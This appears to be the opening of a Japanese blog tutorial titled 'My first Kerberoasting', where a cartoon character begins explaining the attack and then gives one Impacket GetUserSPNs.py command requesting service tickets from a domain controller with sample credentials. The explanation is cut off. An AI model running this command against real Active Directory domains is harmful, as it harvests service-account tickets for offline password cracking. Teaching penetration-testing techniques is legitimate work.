+++
title = "初めてのKerberoasting"
date = 2025-06-01
+++

![アイちゃん](/images/ai-chan.png)

<div class="character-box">
  <img src="/images/ai-chan.png" alt="AIちゃん">
  <div class="speech-bubble">
    ねぇ、Kerberoastingって知ってる？<br>
    これはサービスアカウントのTGSチケットを使った…（以下略）
  </div>
</div>

```bash
GetUserSPNs.py -request -dc-ip 10.10.10.10 corp.local/john:pass123
